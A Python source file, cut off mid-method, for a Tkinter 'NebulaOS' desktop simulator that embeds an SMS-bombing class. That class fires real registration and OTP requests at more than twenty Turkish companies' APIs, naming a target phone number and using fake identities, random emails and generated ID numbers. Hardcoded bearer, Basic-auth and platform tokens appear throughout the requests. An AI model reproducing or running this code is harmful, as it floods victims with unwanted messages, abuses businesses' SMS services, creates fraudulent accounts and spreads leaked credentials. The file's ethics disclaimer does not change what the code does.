import os
import datetime
import shutil
import getpass
import tkinter as tk
from tkinter import scrolledtext, simpledialog, messagebox, Toplevel, Label, Button, Frame, Canvas
import sys
import threading
import requests
from random import choice, randint, uniform
from string import ascii_lowercase
import time
import json

# --- Pygame ve OpenCV Video Oynatma için Gerekli Kütüphaneler ---
# Termux'ta Tkinter GUI'sinin yanı sıra Pygame ve OpenCV gibi kütüphanelerin
# düzgün çalışması için ek paketler ve X server/VNC kurulumu gerekebilir.
# Bu blok, kütüphaneler kurulu değilse hata vermez, sadece uyarı verir.
try:
    import pygame
    import cv2
except ImportError:
    print("Hata: Video oynatmak için 'opencv-python' ve 'pygame' kütüphaneleri kurulu değil.")
    print("Lütfen Termux'ta 'pkg install python-pip && pip install opencv-python pygame' komutunu çalıştırın.")
    print("GUI desteği için ayrıca 'pkg install x11-repo && pkg install termux-x11-nightly' gibi paketler ve bir X server uygulaması gerekebilir.")

# --- Global Variables and Constants ---
SYSTEM_NAME = "NebulaOS"
OS_VERSION = "0.3" # İşletim Sistemi Sürümü masaüstü için güncellendi

BOOT_LOGO = r"""
███╗   ██╗███████╗██████╗ ██╗   ██╗██╗     ██████╗  ██████╗ ███████╗
████╗  ██║██╔════╝██╔══██╗██║   ██║██║     ██╔══██╗██╔═══██╗██╔════╝
██╔██╗ ██║█████╗  ██████╔╝██║   ██║██║     ██████╔╝██║   ██║███████╗
██║╚██╗██║██╔══╝  ██╔══██╗██║   ████║     ██╔══██╗██║   ██║╚════██║
██║ ╚████║███████╗██║  ██║╚██████╔╝███████╗██║  ██║╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                   
                  ✨ Yükleniyor... Yıldızlar Hizalanıyor... ✨
"""

NEBULA_ROOT = "nebula_root"
SETUP_FLAG_FILE = os.path.join(NEBULA_ROOT, ".setup_complete")
CONFIG_FILE = os.path.join(NEBULA_ROOT, "nebula_config.json")

current_directory = "/"
current_user = None

users = {
    "root": "rootpass",
    "gezgin": "gezginpass"
}

original_stdout = sys.stdout

system_config = {
    "language": "Türkçe",
    "keyboard_layout": "QWERTY",
    "country": "Türkiye",
    "theme": "dark_nebula",
    "desktop_background_color": "#1a1a2e" # Yeni masaüstü arka plan rengi
}

# --- GUI Çıktı Yönlendirme Sınıfı ---
class TextRedirector:
    """Stdout'u bir Tkinter kaydırmalı metin widget'ına VE orijinal stdout'a yönlendirir."""
    def __init__(self, widget, original_stdout):
        self.widget = widget
        self.original_stdout = original_stdout

    def write(self, text):
        self.widget.insert(tk.END, text)
        self.widget.see(tk.END)
        self.original_stdout.write(text) # Orijinal stdout'a da yaz

    def flush(self):
        self.original_stdout.flush()

# --- SendSms Sınıfı (sms.py'den entegre edildi, gerçek HTTP istekleri kullanır) ---
class SendSms:
    """
    Çeşitli servislere SMS mesajları göndermeyi dener.
    Bu sınıf, gerçek HTTP istekleri yaparak SMS gönderme işlevini simüle etmek yerine,
    gerçek API uç noktalarını hedef alır.
    
    ÖNEMLİ GÜVENLİK VE ETİK UYARISI:
    Bu araç, yalnızca yasal ve izinli amaçlar için kullanılmalıdır.
    İzinsiz SMS göndermek yasa dışıdır ve ciddi sonuçları olabilir.
    API anahtarları gibi hassas bilgileri asla doğrudan koda gömmeyin veya herkese açık bir şekilde paylaşmayın.
    """
    adet = 0

    def __init__(self, phone, mail, output_widget):
        self.output_widget = output_widget # Çıktıyı yönlendirmek için widget
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    def _log_result(self, service_name, success, message=""):
        """Sonuçları GUI'ye kaydetmek için dahili yardımcı."""
        status = "[+] Başarılı!" if success else "[-] Başarısız!"
        extra_info = f" ({message})" if message else ""
        # Çıktıyı doğrudan widget'a yazdır
        if self.output_widget:
            self.output_widget.insert(tk.END, f"{status} {self.phone} --> {service_name}{extra_info}\n")
            self.output_widget.see(tk.END)
        else:
            print(f"{status} {self.phone} --> {service_name}{extra_info}") # Eğer widget yoksa konsola yaz
        if success:
            self.adet += 1

    # SMS Gönderme Metotları (Gerçek HTTP İstekleri) - Orijinal koddan kopyalanmıştır.
    # Bu metodlar, HTTP istekleri yaparak SMS gönderme işlevini simüle eder.
    # Gerçek API uç noktalarını hedef alırlar.
    # GÜVENLİK UYARISI: Bu kod, güvenlik açıkları içerebilir ve kötüye kullanıma açıktır.
    # Yalnızca eğitim ve yasal test amaçlı kullanılmalıdır.
    def KahveDunyasi(self):
        service_name = "api.kahvedunyasi.com"
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json_payload={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("processStatus") == "Success"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:    
            self._log_result(service_name, False, str(e))
        

    def Wmf(self):
        service_name = "wmf.com.tr"
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            success = wmf.status_code == 202
            self._log_result(service_name, success, f"API Yanıtı: {wmf.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    
    
    def Bim(self):
        service_name = "bim.veesk.net"
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
            success = bim.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {bim.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Englishhome(self):
        service_name = "englishhome.com"
        try:
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
            json_payload={"Phone": self.phone, "XID": ""}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("isError") == False
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
          

    def Suiste(self):
        service_name = "suiste.com"
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            success = r.json().get("code") == "common.success"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
                
    
    def KimGb(self):
        service_name = "3uptzlakwi.execute-api.eu-west-1.amazonaws.com"
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
            
    
    def Evidea(self):
        service_name = "evidea.com"
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)      
            success = r.status_code == 202
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e)) 


    def Ucdortbes(self):
        service_name = "api.345dijital.com"
        try:
            url = "https://api.345dijital.com:443/api/users/register"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
            json_payload={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("error") == "E-Posta veya telefon zaten kayıtlı!" or r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def TiklaGelsin(self):
        service_name = "svc.apps.tiklagelsin.com"
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
            json_payload={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("data", {}).get("generateOtp") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Naosstars(self):
        service_name = "api.naosstars.com"
        try:
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
            json_payload={"telephone": f"+90{self.phone}", "type": "register"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Koton(self):
        service_name = "koton.com"
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            success = r.status_code == 202
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Hayatsu(self):
        service_name = "api.hayatsu.com.tr"
        try:
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
            r = requests.post(url, headers=headers, data=data, timeout=6)
            success = r.json().get("is_success") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Hizliecza(self):
        service_name = "prod.hizliecza.net"
        try:
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
            json_payload={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def Metro(self):
        service_name = "mobile.metro-tr.com"
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json_payload={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("status") == "success"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))


    def File(self):
        service_name = "api.filemarket.com.tr"
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json_payload={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("responseType") == "SUCCESS"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
            
        
    def Akasya(self):
        service_name = "akasyaapi.poilabs.com"
        try:
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
            json_payload={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("result") == "SMS sended succesfully!"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
        
        
    def Akbati(self):
        service_name = "akbatiapi.poilabs.com"
        try:
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
            json_payload={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("result") == "SMS sended succesfully!"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
        

    def Komagene(self):
        service_name = "gateway.komagene.com"
        try:
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            json_payload={"FirmaId": 32, "Telefon": self.phone}
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            r = requests.post(url=url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("Success") == True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    
    
    def Porty(self):
        service_name = "panel.porty.tech"
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json_payload={"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json_payload, headers=headers, timeout=6)
            success = r.json().get("status")== "success"
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    
    
    def Tasdelen(self):
        service_name = "tasdelen.sufirmam.com"
        try:
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
            json_payload={"phone": self.phone}
            r = requests.post(url=url, headers=headers, json=json_payload, timeout=6)
            success = r.json().get("result")== True
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    

    def Uysal(self):
        service_name = "api.uysalmarket.com.tr"
        try:
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.uysalmarket.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers"}
            json_payload={"phone_number": self.phone}
            r = requests.post(url, headers=headers, json=json_payload, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    
    
    def Yapp(self):
        service_name = "yapp.com.tr"
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
            json_payload={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
            r = requests.post(url=url, json=json_payload, headers=headers, timeout=6)
            success = r.status_code == 200
            self._log_result(service_name, success, f"API Yanıtı: {r.status_code}")
        except Exception as e:
            self._log_result(service_name, False, str(e))
    
    
    def YilmazTicaret(self):
        service_name = "app.buyursungelsin.com"
        try:
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl", "Accept-Encoding": "gzip, deflate, br", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9"}
